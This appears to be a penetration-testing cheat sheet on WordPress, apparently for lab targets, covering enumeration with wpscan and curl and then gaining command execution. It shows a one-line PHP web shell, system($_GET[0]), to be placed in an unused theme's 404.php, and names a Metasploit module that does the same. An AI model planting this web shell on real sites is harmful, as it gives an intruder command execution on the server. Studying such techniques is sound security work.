Wordpress (TCP/80, TCP/443)

WordPress is a free and open-source content management system (CMS) that lets anyone build and manage websites easily

Enumeration

    Automated enumeration

       wpscan --url giveback.htb -e vp --plugins-detection mixed --api-token D1bt...

    Manual enumeration

      In order to check if a website is a wordpress we could lookfor the robots.txt file which would look like this

      User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

      Another way to check it is by using curl

      curl -s http://blog.inlanefreight.local | grep WordPress

      Interesting endpoints

        http://domain.com/wp-admin   #Admin login 
http://domain.com/wp-content
http://domain.com/wp-content/plugins #Plugins directory
http://domain.com/wp-content/themes  #Themes directory
http://domain.com/wp-content/uploads #Uploads directory

    Identifying vulnerabilities

      Themes

        An easy way of identifying vulnerabilties is through themes. Once we identifyied the theme name we could search for vulnerabilities related

        curl -s http://blog.inlanefreight.local/ | grep themes

      Plugins

        The same can be performed with plugins

        curl -s http://blog.inlanefreight.local/ | grep plugins

        In order to check for the plugin version we could browse the plugin name and luckily we'll find a README.txt file 

        http://blog.inlanefreight.local/wp-content/plugins/plugin-name/

Exploitation

    Command execution

      Once you have access to the administration panel of wordpress a good option to acquire command execution is to modify an existing theme and adding some fun stuff. Be intelligent and don't modify the current theme. Here are the steeps to perform it

      • Access the admin panel and then go to the appereance-> Theme Editor section
      • In the right side will appear all the themes select one of them which is not using currently (You can check which of them is selectec in the Appereance-> Themes section)
      • Select a simple page just like 404.php and add the following code
        • system($_GET[0]);
      • Then search for that page and pass the command as the first parameter
        • http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

      You can automate this prcess by using the metasploit module

      exploit/unix/webapp/wp_admin_shell_upload
